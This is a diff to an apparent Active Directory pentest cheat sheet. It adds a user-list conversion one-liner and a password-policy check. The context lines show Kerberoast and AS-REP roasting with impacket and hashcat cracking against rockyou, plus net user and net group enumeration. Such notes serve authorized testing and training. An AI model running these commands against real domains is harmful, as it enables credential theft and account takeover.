@@ -13,6 +13,9 @@ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 # AS-REP roast
 impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+
+# Convert net user output to user list
+tr -s ' ' '\n' < users.txt | sed '/^$/d'
 ```
 
 With valid credentials for a domain user, we can first enumerate the domain remotely with [PowerView.py](https://github.com/aniqfakhrul/powerview.py)
@@ -113,6 +116,9 @@ net user /domain
 
 # Check domain user information
 net user offsec /domain
+
+# Check password policy
+net accounts
 
 # Check domain groups
 net group /domain
